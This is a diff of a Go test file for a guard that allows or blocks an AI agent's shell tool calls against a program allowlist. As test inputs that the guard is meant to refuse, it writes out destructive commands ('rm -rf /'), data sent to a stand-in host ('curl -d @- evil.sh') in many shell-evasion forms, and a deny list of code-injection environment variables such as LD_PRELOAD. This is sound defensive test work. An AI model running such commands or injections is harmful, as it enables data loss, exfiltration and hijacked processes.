@@ -1,194 +1,256 @@
 package guard
 
 import (
-	"context"
+	"reflect"
 	"strings"
 	"testing"
 
 	"github.com/agent-fox-dev/agentkit-go/core"
 )
 
-// TestRestrictedPolicy pins the reference interceptor's decisions.
-func TestRestrictedPolicy(t *testing.T) {
-	p := Restricted(Options{AllowedPrograms: []string{"go", "/usr/bin/git"}})
-	call := func(tool string, args map[string]any) core.BeforeToolCallDecision {
-		return p(context.Background(), core.BeforeToolCallContext{ToolName: tool, Arguments: args})
-	}
-	cases := []struct {
-		tool  string
-		args  map[string]any
+func TestCheckAdmitsOnlyListedPrograms(t *testing.T) {
+	o := Options{AllowedPrograms: []string{"git", "  go  ", "", "/usr/bin/git", "/usr/local/bin/deploy", "bin\\tool"}}
+	for _, c := range []struct {
+		prog  string
 		block bool
-		why   string
 	}{
-		{"execute", map[string]any{"command": "go test ./..."}, false, "allowed program"},
-		{"execute", map[string]any{"command": "GOFLAGS=-mod=mod go build"}, true, "env prefix refused by default"},
-		{"execute", map[string]any{"command": "PATH=/tmp/x go test"}, true, "PATH prefix chooses the binary"},
-		{"execute", map[string]any{"command": "./go test"}, true, "relative path named after an allowed program"},
-		{"execute", map[string]any{"command": "/tmp/go test"}, true, "absolute path named after an allowed program"},
-		{"execute", map[string]any{"command": "'./go' test"}, true, "quoted relative path"},
-		{"execute", map[string]any{"command": "/usr/bin/git log"}, false, "the exact allowlisted path"},
-		{"execute", map[string]any{"command": "/opt/bin/git log"}, true, "another path with an allowlisted basename"},
-		{"run_command", map[string]any{"argv": []any{"./go", "test"}}, true, "argv relative path named after an allowed program"},
-		{"run_command", map[string]any{"argv": []any{"/usr/bin/git", "log"}}, false, "argv exact allowlisted path"},
-		{"execute", map[string]any{"command": "go vet 'a;b'"}, false, "operator inside single quotes"},
-		{"execute", map[string]any{"command": "git log"}, true, "a bare name is not admitted by a listed path"},
-		{"execute", map[string]any{"command": "go test | tee out"}, true, "pipe"},
-		{"execute", map[string]any{"command": "go test; rm -rf /"}, true, "list operator"},
-		{"execute", map[string]any{"command": "echo $(whoami)"}, true, "command substitution"},
-		{"execute", map[string]any{"command": "git log \"$HOME\""}, true, "expansion inside double quotes"},
-		{"execute", map[string]any{"command": "rm -rf /"}, true, "program not allowed"},
-		{"execute", map[string]any{"command": ""}, true, "empty"},
-		{"run_command", map[string]any{"argv": []any{"go", "vet", "a;b"}}, false, "argv is not re-parsed"},
-		{"run_command", map[string]any{"argv": []any{"curl", "x"}}, true, "argv program not allowed"},
-		{"read_file", map[string]any{"path": "x"}, false, "non-shell tools pass"},
-	}
-	for _, c := range cases {
-		if got := call(c.tool, c.args).Block; got != c.block {
-			t.Errorf("%s %v: block=%v, want %v (%s)", c.tool, c.args, got, c.block, c.why)
-		}
-	}
-	if !call("execute", map[string]any{"command": "go test | tee"}).Block {
-		t.Fatal("pipe")
-	}
-	loose := Restricted(Options{AllowedPrograms: []string{"go", "tee"}, AllowShellOperators: true})
-	if d := loose(context.Background(), core.BeforeToolCallContext{ToolName: "execute",
-		Arguments: map[string]any{"command": "go test | tee"}}); d.Block {
-		t.Fatalf("AllowShellOperators must permit the pipe: %s", d.Reason)
-	}
-	// AllowEnvPrefixes admits an assignment prefix, but never one that changes
-	// which binary runs or what is loaded into it.
-	env := Restricted(Options{AllowedPrograms: []string{"go", "ls"}, AllowEnvPrefixes: true})
-	for cmd, want := range map[string]bool{
-		"GOFLAGS=-mod=mod go build":         false,
-		"CGO_ENABLED=0 GOOS=linux go test":  false,
-		"PATH=/anything ls":                 true,
-		"LD_PRELOAD=/x.so ls":               true,
-		"LD_LIBRARY_PATH=/x ls":             true,
-		"DYLD_INSERT_LIBRARIES=/x.dylib ls": true,
-		"FOO=1 BASH_ENV=/x go test":         true,
-		"GIT_EXEC_PATH=/x go test":          true,
-		"NODE_OPTIONS=--require=/x go test": true,
-		"PYTHONPATH=/x go test":             true,
-		"PERL5OPT=-Mx go test":              true,
-		"x-y=1 ls":                          true, // not an assignment: bash runs `x-y=1`
-		"./x=1 ls":                          true,
-		// A quoted value is one word: the program is the word after it.
-		`X='a ls' rm -rf /`: true,
-		`X="a ls" rm -rf /`: true,
-		"X='a\tls' rm":      true,
-		`X="a \" ls" rm`:    true,
-		`X='a ls' ls -l`:    false,
-		`X="a b" go test`:   false,
-		`'X=1' ls`:          true, // quoted, so not an assignment: bash runs `X=1`
-		`X='a ls`:           true, // unterminated quote: nothing runs
-		`"ls" -l`:           false,
-		`l\s -l`:            false, // bash runs ls
-		`l"s"x`:             true,  // bash runs lsx
-		`"./go" test`:       true,
-		// Injection variables beyond Perl, Python, Node and Ruby.
-		"JAVA_TOOL_OPTIONS=-javaagent:/x.jar go test": true,
-		"_JAVA_OPTIONS=-javaagent:/x.jar go test":     true,
-		"JDK_JAVA_OPTIONS=-javaagent:/x.jar go test":  true,
-		"CLASSPATH=/x go test":                        true,
-		"DOTNET_STARTUP_HOOKS=/tmp/evil.dll go test":  true,
-		"LUA_INIT=@/x.lua go test":                    true,
-		"LUA_INIT_5_4=@/x.lua go test":                true,
-		"LUA_PATH=/x/?.lua go test":                   true,
-		"LUA_CPATH=/x/?.so go test":                   true,
-		"GCONV_PATH=/tmp/gconv go test":               true,
-		"PHPRC=/x go test":                            true,
-		"PHP_INI_SCAN_DIR=/x go test":                 true,
-		"TCLLIBPATH=/x go test":                       true,
-		"ZDOTDIR=/x go test":                          true,
-		"HOME=/x go test":                             true,
+		{"git", false},
+		{"go", false}, // a listed name is trimmed
+		{"/usr/bin/git", false},
+		{"/usr/bin/../bin/git", false}, // compared after cleaning
+		{"/usr/local/bin/deploy", false},
+		{"bin\\tool", false}, // a backslash makes a path too
+		{"rm", true},
+		{"./git", true}, // the workspace's git, not the listed one
+		{"/opt/bin/git", true},
+		{"/usr/bin/go", true}, // a listed name does not admit a path
+		{"deploy", true},      // a listed path does not admit a bare name
+		{"", true},
 	} {
-		if got := env(context.Background(), core.BeforeToolCallContext{ToolName: "execute",
-			Arguments: map[string]any{"command": cmd}}).Block; got != want {
-			t.Errorf("AllowEnvPrefixes %q: block=%v, want %v", cmd, got, want)
+		d := Check([]string{c.prog, "arg"}, o)
+		if d.Block != c.block {
+			t.Errorf("Check(%q) = %+v, want block %v", c.prog, d, c.block)
 		}
 	}
-	term := Restricted(Options{TerminateOnBlock: true})
-	if d := term(context.Background(), core.BeforeToolCallContext{ToolName: "execute",
-		Arguments: map[string]any{"command": "ls"}}); !d.Block || !d.Terminate {
-		t.Fatal("TerminateOnBlock must cast the REQ-TOOL-13.2 vote")
+	want := Decision{Block: true, Reason: `program "rm" is not on the allowlist`, Terminate: true}
+	if d := Check([]string{"rm", "-rf", "dir"}, Options{AllowedPrograms: []string{"git"}, TerminateOnBlock: true}); d != want {
+		t.Errorf("Check(rm) = %+v, want %+v", d, want)
+	}
+	if d := Check(nil, Options{TerminateOnBlock: true}); d != (Decision{Block: true, Reason: "empty argv", Terminate: true}) {
+		t.Errorf("Check(empty) = %+v", d)
+	}
+	if d := Check([]string{"ls"}, Options{}); !d.Block {
+		t.Error("an empty allowlist admitted ls")
 	}
 }
 
-// TS-12-29: Decision carries Block, Reason and Terminate, and the shell tools
-// are execute and run_command.
-func TestDecisionAndShellToolNames_TS12_29(t *testing.T) {
-	d := Decision{Block: true, Reason: "test", Terminate: true}
-	if !d.Block || d.Reason != "test" || !d.Terminate {
-		t.Fatalf("Decision = %+v", d)
-	}
-	if strings.Join(ShellToolNames, ",") != "execute,run_command" {
-		t.Fatalf("ShellToolNames = %v, want [execute run_command]", ShellToolNames)
-	}
-}
-
-// TS-12-30: an empty argv is blocked.
-func TestCheckBlocksEmptyArgv_TS12_30(t *testing.T) {
-	if d := Check([]string{}, Options{TerminateOnBlock: true}); d != (Decision{Block: true, Reason: "empty argv", Terminate: true}) {
-		t.Fatalf("Check(empty) = %+v", d)
-	}
-}
-
-// TS-12-31: a path is allowed only as that exact, cleaned path.
-func TestCheckMatchesPathsExactly_TS12_31(t *testing.T) {
-	o := Options{AllowedPrograms: []string{"/usr/bin/git"}, TerminateOnBlock: true}
-	want := Decision{Block: true, Reason: `program "/usr/bin/curl" is not on the allowlist`, Terminate: true}
-	if d := Check([]string{"/usr/bin/curl", "url"}, o); d != want {
-		t.Fatalf("Check(/usr/bin/curl) = %+v, want %+v", d, want)
-	}
-	if d := Check([]string{"/usr/bin/../bin/git"}, o); d.Block {
-		t.Fatalf("a path that cleans to an allowed one was blocked: %+v", d)
-	}
-	if d := Check([]string{"./git"}, o); !d.Block {
-		t.Fatal("./git is the workspace's git, not the allowed path")
-	}
-}
-
-// TS-12-32: a bare name not on the allowlist is blocked.
-func TestCheckBlocksUnlistedNames_TS12_32(t *testing.T) {
-	o := Options{AllowedPrograms: []string{"git", "go"}}
-	want := Decision{Block: true, Reason: `program "rm" is not on the allowlist`}
-	if d := Check([]string{"rm", "-rf", "dir"}, o); d != want {
-		t.Fatalf("Check(rm) = %+v, want %+v", d, want)
-	}
-}
-
-// TS-12-33: an allowed bare name or exact path runs.
-func TestCheckAllowsListedPrograms_TS12_33(t *testing.T) {
-	o := Options{AllowedPrograms: []string{"git", "/usr/local/bin/deploy"}}
-	if d := Check([]string{"git", "status"}, o); d.Block {
-		t.Fatalf("git was blocked: %+v", d)
-	}
-	if d := Check([]string{"/usr/local/bin/deploy"}, o); d.Block {
-		t.Fatalf("the listed path was blocked: %+v", d)
-	}
-}
-
-// TS-12-34: Restricted refuses blocked tools, shell operators and
-// environment prefixes before asking Check about the program.
-func TestRestrictedChecksBeforeCheck_TS12_34(t *testing.T) {
-	hook := Restricted(Options{BlockedTools: []string{"danger_tool"}, AllowedPrograms: []string{"git"}})
-	ctx := context.Background()
-	cases := []struct {
-		name  string
-		in    core.BeforeToolCallContext
-		block bool
-		why   string
+func TestRestrictedDecidesEachShellCall(t *testing.T) {
+	g := Restricted(Options{AllowedPrograms: []string{"go", "/usr/bin/git"}, BlockedTools: []string{"danger_tool", "execute_later"}})
+	for _, c := range []struct {
+		in     core.BeforeToolCallContext
+		reason string // "" when it runs
 	}{
-		{"blocked tool", core.BeforeToolCallContext{ToolName: "danger_tool"}, true, `tool "danger_tool" is not permitted`},
-		{"pipe", core.BeforeToolCallContext{ToolName: "execute", Arguments: map[string]any{"command": "git status | cat"}}, true, "shell operator"},
-		{"env prefix", core.BeforeToolCallContext{ToolName: "execute", Arguments: map[string]any{"command": "PATH=/tmp git status"}}, true, "environment assignment"},
-		{"unlisted", core.BeforeToolCallContext{ToolName: "execute", Arguments: map[string]any{"command": "rm -rf ."}}, true, `guard.Restricted: program "rm" is not on the allowlist`},
-		{"allowed", core.BeforeToolCallContext{ToolName: "execute", Arguments: map[string]any{"command": "git commit"}}, false, ""},
+		{execCall("go test ./..."), ""},
+		{execCall("/usr/bin/git log"), ""},
+		{execCall(`go vet 'a;b' "a|b" a\;b`), ""}, // quoted and escaped operators are data
+		{execCall(`"go" test`), ""},
+		{execCall(`g\o test`), ""},
+		{execCall("rm -rf /"), `guard.Restricted: program "rm" is not on the allowlist`},
+		{execCall("git log"), `program "git"`},
+		{execCall("./go test"), `program "./go"`},
+		{execCall("'./go' test"), `program "./go"`},
+		{execCall(`g"o"x`), `program "gox"`},
+		{execCall("go test | tee out"), `shell operator "|"`},
+		{execCall("go test; rm -rf /"), `shell operator ";"`},
+		{execCall("go test && x"), `shell operator "&"`},
+		{execCall("go test > out"), `shell operator ">"`},
+		{execCall("go test\nrm x"), "shell operator \"\\n\""},
+		{execCall("(go test)"), `shell operator "("`},
+		{execCall("echo $(whoami)"), `shell operator "$"`},
+		{execCall("go \"$HOME\""), `shell operator "$"`},
+		{execCall("go \"`id`\""), "shell operator \"`\""},
+		{execCall("go 'a"), "cannot be read with certainty"},
+		{execCall(""), "the command runs no program"},
+		{execCall("   "), "the command runs no program"},
+		{execCall("GOFLAGS=-mod=mod go build"), "environment assignment GOFLAGS= in front of the program is not permitted"},
+		{core.BeforeToolCallContext{ToolName: "execute"}, "runs no program"},
+		{argvCall("go", "vet", "a;b"), ""}, // argv is not re-parsed
+		{argvCall("/usr/bin/git", "log"), ""},
+		{argvCall("./go", "test"), `program "./go"`},
+		{argvCall("curl", "x"), `program "curl"`},
+		{argvCall("go", 1), "guard.Restricted: argv[1] is not a string"},
+		{argvCall(), "empty argv"},
+		{core.BeforeToolCallContext{ToolName: "danger_tool"}, `guard.Restricted: tool "danger_tool" is not permitted`},
+		{core.BeforeToolCallContext{ToolName: "execute_later"}, "is not permitted"},
+		{core.BeforeToolCallContext{ToolName: "read_file", Arguments: map[string]any{"path": "x"}}, ""},
+	} {
+		d := decide(g, c.in)
+		if d.Block != (c.reason != "") || !strings.Contains(d.Reason, c.reason) || d.Terminate {
+			t.Errorf("%s %v = %+v, want reason %q", c.in.ToolName, c.in.Arguments, d, c.reason)
+		}
 	}
-	for _, c := range cases {
-		d := hook(ctx, c.in)
-		if d.Block != c.block || !strings.Contains(d.Reason, c.why) {
-			t.Errorf("%s: %+v, want block=%v mentioning %q", c.name, d, c.block, c.why)
+}
+
+func TestRestrictedTerminatesOnEveryBlockWhenAsked(t *testing.T) {
+	g := Restricted(Options{AllowedPrograms: []string{"go"}, BlockedTools: []string{"x"}, TerminateOnBlock: true})
+	for _, in := range []core.BeforeToolCallContext{
+		execCall("ls"), execCall("go | x"), execCall("X=1 go"), execCall("go 'a"), execCall(""),
+		argvCall("ls"), argvCall(1), {ToolName: "x"},
+	} {
+		if d := decide(g, in); !d.Block || !d.Terminate {
+			t.Errorf("%s %v = %+v, want a block that terminates", in.ToolName, in.Arguments, d)
+		}
+	}
+	if d := decide(g, execCall("go test")); d.Block || d.Terminate {
+		t.Errorf("an admitted call = %+v", d)
+	}
+}
+
+// AllowEnvPrefixes admits an assignment in front of a program, but never one
+// that changes which binary runs or what is loaded into it, and an
+// assignment is recognised as bash recognises it.
+func TestRestrictedAllowEnvPrefixesKeepsTheDeniedNames(t *testing.T) {
+	g := Restricted(Options{AllowedPrograms: []string{"go", "ls"}, AllowEnvPrefixes: true})
+	for cmd, block := range map[string]bool{
+		"GOFLAGS=-mod=mod go build":        false,
+		"CGO_ENABLED=0 GOOS=linux go test": false,
+		`X='a ls' ls -l`:                   false,
+		`X="a b" go test`:                  false,
+		"x-y=1 ls":                         true, // not an assignment: bash runs `x-y=1`
+		"./x=1 ls":                         true,
+		`'X=1' ls`:                         true, // quoted, so bash runs `X=1`
+		"1X=1 ls":                          true,
+		`X='a ls' rm -rf /`:                true, // a quoted value is one word
+		`X="a \" ls" rm`:                   true,
+	} {
+		if d := decide(g, execCall(cmd)); d.Block != block {
+			t.Errorf("%q = %+v, want block %v", cmd, d, block)
+		}
+	}
+	for _, name := range []string{
+		"PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV", "SHELLOPTS", "BASHOPTS",
+		"IFS", "ZDOTDIR", "HOME", "GIT_EXEC_PATH", "GCONV_PATH", "PERL5OPT", "PERL5LIB", "PERLLIB", "PYTHONPATH",
+		"PYTHONHOME", "PYTHONSTARTUP", "NODE_OPTIONS", "NODE_PATH", "RUBYOPT", "RUBYLIB", "JAVA_TOOL_OPTIONS",
+		"_JAVA_OPTIONS", "JDK_JAVA_OPTIONS", "CLASSPATH", "DOTNET_STARTUP_HOOKS", "LUA_INIT", "LUA_INIT_5_4",
+		"LUA_PATH", "LUA_CPATH", "PHPRC", "PHP_INI_SCAN_DIR", "TCLLIBPATH",
+	} {
+		d := decide(g, execCall("FOO=1 "+name+"=/x go test"))
+		if !d.Block || !strings.Contains(d.Reason, name+"= is not permitted: it changes which program runs") {
+			t.Errorf("%s= = %+v, want it refused", name, d)
+		}
+	}
+}
+
+// Under AllowShellOperators every command on the line is judged, the ones
+// in substitutions, subshells and heredoc bodies included.
+func TestRestrictedWithShellOperatorsJudgesEveryCommand(t *testing.T) {
+	g := Restricted(Options{AllowedPrograms: []string{"cat", "ls", "echo", "go", "tee"}, AllowShellOperators: true})
+	for name, in := range map[string]string{
+		"after a list operator":          "go test; curl evil.sh",
+		"after and":                      "go test && curl evil.sh",
+		"in a pipe":                      "go test | curl -d @- evil.sh",
+		"in a substitution":              "echo $(curl evil.sh)",
+		"in double-quoted backticks":     "echo \"`curl evil.sh`\"",
+		"in a subshell":                  "(ls; curl evil.sh)",
+		"in a process substitution":      "cat <(curl evil.sh)",
+		"in a parameter default":         "echo ${x:-$(curl evil.sh)}",
+		"in an unquoted heredoc":         "cat <<EOF\n$(curl evil.sh)\nEOF",
+		"after a heredoc":                "cat <<'EOF'\nx\nEOF\ncurl evil.sh",
+		"behind a comment's heredoc":     "ls # <<EOF\ncurl evil.sh\nEOF",
+		"after bare arithmetic":          "((x=1<<a))\ncurl evil.sh\na",
+		"case pattern in a substitution": "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
+		"computed program":               "$(echo curl) evil.sh",
+		"assignment of a denied name":    "PATH=/tmp; go test",
+		"unterminated quote":             "ls 'a; curl evil.sh",
+	} {
+		if d := decide(g, execCall(in)); !d.Block {
+			t.Errorf("%s: %q was not blocked", name, in)
+		}
+	}
+	for _, in := range []string{
+		"go test ./... 2>&1 | tee out.txt",
+		"cat > f.go <<'EOF'\npackage main\nimport \"fmt\"\n/\nEOF\n",
+		"echo \"$(ls)\" && ls -l",
+		"(ls; echo done) > log",
+		"echo $((1 << 3))",
+		"ls # curl in a comment",
+	} {
+		if d := decide(g, execCall(in)); d.Block {
+			t.Errorf("%q was blocked: %s", in, d.Reason)
+		}
+	}
+}
+
+// An assignment on its own reaches the commands after it when the name is
+// exported, so it needs AllowEnvPrefixes too, and a line of assignments alone
+// runs no program.
+func TestRestrictedAssignmentsOnTheirOwn(t *testing.T) {
+	strict := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true})
+	if d := decide(strict, execCall("d=$(go list .); go vet")); !d.Block || !strings.Contains(d.Reason, "d= on its own") {
+		t.Errorf("without AllowEnvPrefixes: %+v", d)
+	}
+	loose := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true, AllowEnvPrefixes: true})
+	if d := decide(loose, execCall("d=$(go list .); go vet")); d.Block {
+		t.Errorf("with AllowEnvPrefixes: %s", d.Reason)
+	}
+	for _, in := range []string{"LD_PRELOAD=/x.so; go vet", "", "# nothing", "X=1", "> out"} {
+		if d := decide(loose, execCall(in)); !d.Block {
+			t.Errorf("%q was admitted", in)
+		}
+	}
+}
+
+func TestAllowIsRestrictedWithThosePrograms(t *testing.T) {
+	calls := []core.BeforeToolCallContext{{ToolName: "read_file"}, {ToolName: "no_such_tool"}}
+	for _, cmd := range []string{"ls", "ls -l src", "cat f", "rm -rf src", "ls | cat", "X=1 ls", "PATH=/x ls",
+		"'ls' a", "./ls", "/usr/bin/git log", "", "echo $(ls)", "git log \"$HOME\"", "ls 'a"} {
+		calls = append(calls, execCall(cmd))
+	}
+	for _, argv := range [][]any{{"ls"}, {"rm", "x"}, {"/usr/bin/git", "log"}, {"./go"}, {}, {"ls", 1}} {
+		calls = append(calls, argvCall(argv...))
+	}
+	for _, programs := range [][]string{nil, {"ls"}, {"ls", "cat", "/usr/bin/git"}, {"", "  ls  ", "a/b", "./go"}} {
+		allow, restricted := Allow(programs...), Restricted(Options{AllowedPrograms: programs})
+		for _, in := range calls {
+			if got, want := decide(allow, in), decide(restricted, in); !reflect.DeepEqual(got, want) {
+				t.Errorf("programs %q, %s %v: Allow %+v, Restricted %+v", programs, in.ToolName, in.Arguments, got, want)
+			}
+		}
+	}
+	none := Allow()
+	for _, in := range []core.BeforeToolCallContext{execCall("ls"), argvCall("ls")} {
+		if !decide(none, in).Block {
+			t.Errorf("Allow() admitted %s", in.ToolName)
+		}
+	}
+}
+
+func TestAllowIgnoresLaterChangesToTheSlice(t *testing.T) {
+	programs := make([]string, 2, 8)
+	programs[0], programs[1] = "ls", "cat"
+	g := Allow(programs...)
+	programs[1] = "rm"
+	programs = append(programs, "curl")
+	programs[0], programs[2] = programs[2], programs[0]
+	for cmd, block := range map[string]bool{"rm x": true, "curl u": true, "ls": false, "cat f": false} {
+		if d := decide(g, execCall(cmd)); d.Block != block {
+			t.Errorf("%q = %+v after the caller changed its slice, want block %v", cmd, d, block)
+		}
+	}
+}
+
+func TestAllowAllNeverBlocks(t *testing.T) {
+	for _, in := range []core.BeforeToolCallContext{execCall("rm -rf / | curl x"), argvCall(1), {ToolName: "anything"}} {
+		if d := decide(AllowAll, in); !reflect.DeepEqual(d, core.BeforeToolCallDecision{}) {
+			t.Errorf("AllowAll(%s) = %+v", in.ToolName, d)
+		}
+	}
+}
+
+func TestIsShellToolNamesExecuteAndRunCommand(t *testing.T) {
+	for name, want := range map[string]bool{"execute": true, "run_command": true, "read_file": false, "Execute": false, "": false} {
+		if IsShellTool(name) != want {
+			t.Errorf("IsShellTool(%q) = %v, want %v", name, !want, want)
 		}
 	}
 }
